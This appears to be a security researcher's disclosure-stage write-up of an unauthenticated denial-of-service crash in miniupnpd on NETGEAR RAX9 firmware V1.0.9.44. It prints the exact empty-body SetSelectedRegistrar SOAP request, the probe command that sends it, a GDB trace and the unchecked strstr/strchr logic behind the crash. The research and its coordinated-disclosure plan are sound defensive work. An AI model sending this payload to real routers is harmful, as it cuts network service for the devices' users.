# RAX9 V1.0.9.44 unauthenticated WPS empty-body DoS candidate

Date: 2026-07-24 UTC

## Result

The genuine `miniupnpd` from the current NETGEAR RAX9 V1.0.9.44 firmware
reproducibly terminates with `SIGSEGV` when an unauthenticated LAN client sends
a valid WFA `SetSelectedRegistrar` SOAPAction whose SOAP `<Body>` is empty.

This is a **zero-day candidate**, not yet a confirmed zero-day. The fault is
distinct from the already-public MiniUPnP SOAPAction issue: the request uses a
short, syntactically valid action containing the required `#` separator. Static
and debugger evidence instead attribute this crash to a null pointer passed to
`strchr(..., '>')` by NETGEAR/MediaTek WPS parsing code.

No remote code execution was demonstrated. Physical-device confirmation and
vendor-side prior-art review remain necessary.

## Exact request

The 274-byte request generated by the repository probe has SHA-256:

`706bb21883291838815fd375453c0c60997dea0d5d5a9f0b54835e22291ba063`

Its semantic form is:

```http
POST /control HTTP/1.1
Host: ROUTER_LAN_IP:UPNP_PORT
SOAPAction: "urn:schemas-wifialliance-org:service:WFAWLANConfig:1#SetSelectedRegistrar"
Content-Length: 115

<?xml version="1.0"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Body></s:Body></s:Envelope>
```

The checked-in probe constructs the authoritative bytes; the displayed
request is provided for readability.

```text
python3 scripts/probe_rax9_distinct_upnp_surfaces.py \
  --suite xml --case empty_body
```

## Clean reproduction

Testing used the exact firmware binary and its shared libraries in disposable
Docker containers with `NetworkMode=none`. The compatibility shim handles only
hardware-private startup operations and does not parse, copy, or modify HTTP
data.

Two independent current-firmware runs produced:

1. Empty SOAP body: daemon exit 139, `oom=false`.
2. Valid `GetExternalIPAddress` control: HTTP 200; empty SOAP body: daemon
   exit 139, `oom=false`.

The final daemon log was:

```text
HTTP REQUEST : POST /control (HTTP/1.1)
SOAPAction: urn:schemas-wifialliance-org:service:WFAWLANConfig:1#SetSelectedRegistrar
Segmentation fault (core dumped)
```

The request contains no oversized field and does not rely on resource
exhaustion.

## Fault attribution

GDB caught:

```text
Program received signal SIGSEGV
pc = 0x2b322e58
a0 = 0x00000000
a1 = 0x0000003e
s0 = 0x00000000

0x2b322e58: lw v0,0(s0)
```

`a1=0x3e` is ASCII `>`. The libc routine is dereferencing a null search
pointer while looking for the end of an XML start tag.

The current binary's WPS action handler at file address `0x2a284` calls
`WSCGetValueFromNameValueList` at `0x2778c` with the request-body pointer and
the `NewMessage` element name. Recovered logic in the helper is equivalent to:

```c
sprintf(open_tag, "<%s", name);
sprintf(close_tag, "</%s>", name);
start = strstr(body, open_tag);
start = strchr(start, '>');
```

When the SOAP body contains no `NewMessage` element, `strstr` returns null.
The helper fails to check that result before calling `strchr`, producing the
observed null dereference. The action handler's later missing-value check is
therefore unreachable for this input.

This root cause is independent of the previously documented unbounded
`strchr(action, '#')` SOAPAction bug:

- different attacker-controlled field;
- different delimiter (`>` rather than `#`);
- different helper and call site;
- null dereference rather than an unbounded read crossing a page; and
- a valid short SOAPAction is used.

## Authentication and reachability

The firmware advertises the WFA device and
`WFAWLANConfig:1` service. Its service description specifies `/control` as the
control URL. MiniUPnPd does not authenticate SOAP control requests, and the
request reaches `SetSelectedRegistrar` before semantic WPS-message validation.

Current evidence supports unauthenticated LAN reachability in genuine-binary
emulation. WAN exposure was not established.

## Other distinct surfaces tested

### Event subscription

The daemon survived six structured cases:

- valid callback;
- callback without angle brackets;
- multiple callback URLs;
- 4,096-byte callback;
- 4,096-byte timeout; and
- 4,096-byte SID.

### SSDP

The daemon survived eight UDP cases:

- empty and truncated datagrams;
- valid `ssdp:all`;
- 4,096-byte `ST`, `MAN`, and `MX` fields;
- a 16,487-byte structured datagram; and
- a maximum 65,507-byte UDP datagram.

### Valid-body WPS messages

`PutMessage` requests containing a `NewInMessage` element survived decoded
payload sizes of 0, 1, 255, 256, 1,024, 4,096, and 16,384 bytes. Hardware
effects are not claimed because the isolated lab substitutes startup-only
hardware compatibility and has no wireless device.

These are bounded negative results, not proof that every state-machine
sequence is safe.

## Prior-art review

Searches on 2026-07-24 covered:

- `WSCGetValueFromNameValueList`;
- `Invalid SetSelectedRegistrar mesg parameter`;
- `WscDevSetSelectedRegistrar`;
- MiniUPnPd/WFA empty-body crashes;
- `SetSelectedRegistrar` denial of service; and
- relevant MiniUPnP CVEs.

No public report matching the exact null-`strchr` root cause was located.

A recent public `SetSelectedRegistrar` report describes a MediaTek kernel
crash caused by malformed WPS TLVs. It is not the same root cause: this
candidate faults in user-space XML element extraction before base64 decoding
or TLV processing.

The absence of a located match is provisional. It does not by itself prove
novelty.

## Classification

## Recommended next actions

1. Reproduce once on a factory-reset physical RAX9 V1.0.9.44 on an isolated
   LAN and confirm UPnP is enabled by default.
2. Capture service loss and automatic-restart behavior without repeatedly
   triggering the device.
3. Submit privately to NETGEAR with the exact request hash, firmware hashes,
   clean controls, debugger trace, and distinct-root-cause explanation.
4. Ask NETGEAR to check internal duplicates and affected sibling models before
   any public disclosure.
5. Do not publish operational details until coordinated disclosure or the
   vendor's disclosure deadline.
